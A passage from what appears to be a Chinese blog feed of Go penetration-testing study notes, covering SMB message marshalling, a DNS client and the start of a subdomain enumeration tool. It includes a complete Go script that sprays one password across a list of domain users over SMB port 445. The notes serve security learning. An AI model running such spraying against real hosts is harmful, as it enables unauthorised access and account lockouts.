class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">marshal</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, meta *Metadata)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> ret []<span class="type">byte</span></span><br><span class="line">typev := reflect.TypeOf(v)</span><br><span class="line">valuev := reflect.ValueOf(v)</span><br><span class="line"></span><br><span class="line">bm, ok := v.(BinaryMarshallable)</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="comment">// Custom marshallable interface found.</span></span><br><span class="line">buf, err := bm.MarshalBinary(meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> typev.Kind() == reflect.Ptr &#123;</span><br><span class="line">valuev = reflect.Indirect(reflect.ValueOf(v))</span><br><span class="line">typev = valuev.Type()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w := bytes.NewBuffer(ret)</span><br><span class="line"><span class="keyword">switch</span> typev.Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Struct:</span><br><span class="line">m := &amp;Metadata&#123;</span><br><span class="line">Tags:   &amp;TagMap&#123;&#125;,</span><br><span class="line">Lens:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">uint64</span>),</span><br><span class="line">Parent: v,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; valuev.NumField(); j++ &#123;</span><br><span class="line">tags, err := parseTags(typev.Field(j))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Tags = tags</span><br><span class="line">buf, err := marshal(valuev.Field(j).Interface(), m)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">m.Lens[typev.Field(j).Name] = <span class="type">uint64</span>(<span class="built_in">len</span>(buf))</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Slice, reflect.Array:</span><br><span class="line"><span class="keyword">switch</span> typev.Elem().Kind() &#123;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, v.([]<span class="type">uint16</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint8:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint8</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint16:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint16</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint32:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint32</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint64:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint64</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(fmt.Sprintf(<span class="string">&quot;Marshal not implemented for kind: %s&quot;</span>, typev.Kind()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> w.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-强制ASN-1编码"><a href="#3-强制ASN-1编码" class="headerlink" title="3. 强制ASN.1编码"></a>3. 强制<code>ASN.1</code>编码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NegTokenInit)</span></span> MarshalBinary(meta *encoder.Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">buf, err := asn1.Marshal(*n)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>asn1.Marshal(*n)</code>适合 go 可以和 asn.1编码与SMB规范定义的基本数据格式配合使用</p><h4 id="4-了解元数据和引用字段"><a href="#4-了解元数据和引用字段" class="headerlink" title="4. 了解元数据和引用字段"></a>4. 了解元数据和引用字段</h4><p>SMB规范中可以知道：从协商响应消息端中获取的字段指的是包含实际值的可变长度字节切片的偏移量和长度</p><p><code>SecurityBufferOffset(两个字节)</code>：从SMB2标头开始到安全缓冲区的偏移量(以字节为单位)</p><p><code>SecurityBufferLength(两个字节)：</code>从安全缓冲区的长度</p><h4 id="5-SMB的实现"><a href="#5-SMB的实现" class="headerlink" title="5. SMB的实现"></a>5. SMB的实现</h4><p>这里略过，因为我看不懂</p><h2 id="0x03-使用SMB包猜测密码"><a href="#0x03-使用SMB包猜测密码" class="headerlink" title="0x03 使用SMB包猜测密码"></a>0x03 使用SMB包猜测密码</h2><p>现在我们来试一下利用<code>SMB</code>包实施在线密码猜解，我们先下载smb包</p><p><code>go get github.com/blackhat-go/bhg/ch-6/smb/smb</code></p><p>接下来编写代码，接受保存换行符分割的用户名，密码，域和目标主体，为了避免将账户锁定在某些域之外，我们将尝试对一个用户列表使用同一个密码，而不是对一个或多个用户使用密码列表。</p><blockquote><p>在线密码猜测可以将账户锁定在域之外，从而有效的实施拒绝服务攻击，测试时务必谨慎。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt; &lt;target_host&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">options := smb.Options&#123;</span><br><span class="line">Password: os.Args[<span class="number">2</span>],</span><br><span class="line">Domain:   os.Args[<span class="number">3</span>],</span><br><span class="line">Host:     os.Args[<span class="number">4</span>],</span><br><span class="line">Port:     <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users := bytes.Split(buf, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> users &#123;</span><br><span class="line">options.User = <span class="type">string</span>(user)</span><br><span class="line">session, err := smb.NewSession(options, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed: %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Success     : %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-通过pass-the-hash重用密码"><a href="#0x04-通过pass-the-hash重用密码" class="headerlink" title="0x04 通过pass the hash重用密码"></a>0x04 通过pass the hash重用密码</h2><p>先搁一下，学内网的时候在返回来看。</p>]]></content>
    
    
    <summary type="html">与SMB和NTLM交互</summary>
    
    
    
    <category term="Go" scheme="https://h0ld1rs.github.io/categories/Go/"/>
    
    
    <category term="Golang" scheme="https://h0ld1rs.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(五)</title>
    <link href="https://h0ld1rs.github.io/posts/12296.html"/>
    <id>https://h0ld1rs.github.io/posts/12296.html</id>
    <published>2022-03-04T10:17:05.000Z</published>
    <updated>2022-03-23T14:25:12.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-五-–DNS的利用"><a href="#Go渗透测试笔记-五-–DNS的利用" class="headerlink" title="Go渗透测试笔记(五)–DNS的利用"></a>Go渗透测试笔记(五)–DNS的利用</h1><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>DNS用于定位Internet，并将其转化为IP地址。他可以成为攻击者手段的有效武器。因为组织通常允许协议的出站连接离开受限制的网络，并且无法充分监视其使用。</p><h2 id="0x01-编写DNS客户端"><a href="#0x01-编写DNS客户端" class="headerlink" title="0x01 编写DNS客户端"></a>0x01 编写DNS客户端</h2><p>Go本质上可以用内置的包<code>net</code>，支持大多数的<code>DNS</code>类型，内置包的好处在于<code>简单易用的API</code>，例如<code>LookupAddr(addr string)</code>返回给定IP地址的主机名列表，但是使用内置包也有缺点:<code>无法指定目标服务器</code>，不过，该包会使用操作系统配置的解析器。另一个缺点是：<code>无法对结果进行深入检查</code></p><p>为了解决这个问题，我们使用一个优秀的由<code>Miek Gieben</code>编写的第三方包，即<code>Go DNS</code>包</p><p>同样，安装命令如下：</p><p><code>go get github.com/miekg/dns</code></p><h3 id="1-检索A记录"><a href="#1-检索A记录" class="headerlink" title="1. 检索A记录"></a>1. 检索A记录</h3><p>编写如下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>FQDN 完全限定域名，该域名指定主机在DNS结构中的精确位置，然后使用一种成为<code>A</code>记录的DNS记录，将该<code>FQDN</code>地址解析为IP地址。</p></blockquote><p>首先，创建一个信的Msg，然后将域转换为可以与DNS服务器交换的FQDN。接下来使用<code>TypeA</code>代表查找A记录</p><p>这里DNS服务器涉及到一个问题</p><blockquote><p> DNS解析中的A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发等 </p><p> <strong>A</strong>记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p><p> NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</p><p> SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中标记哪一台是主服务器</p><p> MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p><p> TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</p></blockquote><p>然后，调用<code>Exchange(*Msg,string)</code>，将消息发送到提供的服务器地址，在本例中使用的是<code>Goole的DNS服务器地址</code></p><p>接下来，我们使用<code>wirshark</code>进行数据包的分析</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190141.png"></p><p>会得到如下的数据，通过捕获的数据包，我们可以看到通过<code>UDP</code>53与<code>8.8.8.8</code>端口连接，还可以看到与<code>DNS</code>信息有关的部分</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190320.png"></p><p>可以看到在请求<code>DNS</code>A记录的同时，将查询先发送给8.8.8.8，然后再从8.8.8.8返回，包含以及解析的IP地址,<code>220.181.38.251</code></p><h3 id="2-使用Msg结构体处理应答"><a href="#2-使用Msg结构体处理应答" class="headerlink" title="2. 使用Msg结构体处理应答"></a>2. 使用<code>Msg</code>结构体处理应答</h3><p>从<code>Exchange(*Msg,string)</code>返回的值是<code>(*Msg error)</code>，返回的错误类型是可以接受的，那，为什么返回了(*Msg)呢？</p><p>先看一下<code>Msg</code>的定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Msg <span class="keyword">struct</span> &#123;</span><br><span class="line">MsgHdr</span><br><span class="line">Compress <span class="type">bool</span>       <span class="string">`json:&quot;-&quot;`</span> <span class="comment">// If true, the message will be compressed when converted to wire format.</span></span><br><span class="line">Question []Question <span class="comment">// Holds the RR(s) of the question section.</span></span><br><span class="line">Answer   []RR       <span class="comment">// Holds the RR(s) of the answer section.</span></span><br><span class="line">Ns       []RR       <span class="comment">// Holds the RR(s) of the authority section.</span></span><br><span class="line">Extra    []RR       <span class="comment">// Holds the RR(s) of the additional section.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结构体包含问询和应答，这使得我们可以将所有<code>DNS</code>合并为一个统一的结构体，结构体<code>Msg</code>拥有多种处理起来也更为容易的方法。</p><p>例如，我么可以使用<code>SetQuestion()</code>修改切片<code>Question</code>，也可以使用方法<code>append()</code>直接修改此切片,可以获得相同的结果。切片<code>Answer</code>，保存查询的情况，其类型为<code>RR</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">in ,err := dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;No records&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _,answer := <span class="keyword">range</span> in.Answer&#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">fmt.Println(a.A)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，从储存的<code>Exchange</code>返回的值，是否存在错误，则调用<code>panic</code>停止程序。可以快速确定堆栈跟踪，并确定错误发生的位置。接下来，先确认<code>Answer</code>的长度至少为1，如果不是，则表明没有记录，则立即返回。毕竟在某些情况下，域名无法解析。</p><p>类型<code>RR</code>，是一个具有两个方法的接口，并且都不允许访问应答中存储的<code>IP</code>地址，要访问这些地址，需要执行类型声明以将<code>数据实例</code>创建为所需要的类型。首先遍历所有应答，然后，对应答类型进行断言。以确保我们正在处理的类型全部是<code>*dns.A</code>的类型。</p><h3 id="3-枚举子域"><a href="#3-枚举子域" class="headerlink" title="3. 枚举子域"></a>3. 枚举子域</h3><p>现在已经可以使用<code>Go</code>创建一个DNS客户端了，在本节中，我们创建一个枚举的子域的工具。</p><p>当我们开始编写工具的时候，必须确定工具使用了那些参数，我们要写的工具参数，包括目标域，包含要猜测的子域文件名，要使用的DNS服务器以及要启动的工作程序数量。Go提供了一个有用的<code>flag</code>包，我们将使用这个包去处理命令参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种方式违反了    <code>Unix</code>法则，因为它定义了一些非可选的参数，当然此处也可以使用<code>os.Args</code>，但是使用<code>flag</code>包能更好的便捷理解</p></blockquote><p>但是，此时的程序时不能编译通过的，我们会收到使用未知变量的错误。我们需要加入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了我们的工具可以输出解析的域名以及各自的IP，我们将创建一个结构类型来储存此信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此工具查询的两种主要的记录类型：A和<code>CNAME</code>，我们将使用单独的函数执行每个查询，每个函数只执行一种操作。</p><blockquote><p>(Canonical Name)记录，(alias from one domain name to another)通常称别名指向 。<br>通俗点讲就是给你的域名起一个别名。比如你的域名是<a href="http://www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容">www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容</a>.<br>把cName和转向功能混为一谈了。cName只能保证<a 